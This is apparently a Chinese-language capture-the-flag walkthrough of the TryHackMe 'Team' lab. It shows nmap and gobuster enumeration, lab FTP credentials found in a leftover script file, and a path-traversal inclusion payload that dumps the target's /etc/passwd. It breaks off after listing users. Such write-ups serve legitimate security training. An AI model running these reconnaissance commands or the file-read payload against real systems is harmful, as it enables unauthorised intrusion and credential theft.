# Team
平台：tryhackme
难度：easy

### 扫描

**快速扫描**
```
sudo nmap -Pn --min-rate 10000 -p- 10.10.248.178
```
扫描结果
```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
```

**版本扫描**
```
sudo nmap -p 21,22,25,80,110 -Pn -sC -sV -O 10.10.248.178
```
扫描结果
```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.3
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
25/tcp  open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
110/tcp open  pop3?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose
Running: Actiontec embedded, Linux 2.4.X
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37
OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**漏洞扫描**
```
sudo nmap -p 21,22,25,80,110 --script=vuln 10.10.248.178
```
扫描结果
```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
110/tcp open  pop3
```

**gobuster扫描**
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.248.178/ -t 30
```
扫不到。(也不是说扫不到，只是结果没有参考意义。)

- 21端口的ftp不能匿名登录
- 80端口是默认的apache2页面
- 默认页面的源代码有一句话，大致意思就是把team.thm添加到hosts里
- 再次访问http://team.thm，可以进到一个新的页面。
- 这里出现了域名，可以对其进行域名爆破

**对team.thm进行爆破**
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://team.thm/ -t 30
```
结果：
```
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
```
**对scripts目录进行二次爆破**
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://team.thm/scripts/ -t 30 -x php,txt,html
```
输出
```
/.php                 (Status: 403) [Size: 273]
/.html                (Status: 403) [Size: 273]
/script.txt           (Status: 200) [Size: 597]
```
查看`http://team.thm/scripts/script.txt`，发现有一句`Note to self had to change the extension of the old "script" in this folder, as it has creds in`，等于说这里有个old的script文件里面有用户的凭据。
文件script.old：
```
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
```
登陆ftp试试：



VHOST扫描：
```
gobuster vhost -u http://team.thm/ -w deepmagic.com-prefixes-top50000.txt -k --append-domain
```
扫出来了dev.team.thn是200，加到hosts里，访问一下
`http://dev.team.thm/`点一下页面的链接变为`http://dev.team.thm/script.php?page=teamshare.php`
根据提示这个地方可以变为`http://dev.team.thm/script.php?page=../../../etc/passwd`(文件包含漏洞)，这个地方输出目标系统的/etc/passwd。
    
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
```
可以看到使用/bin/bash的两个低权限用户gyles和dale




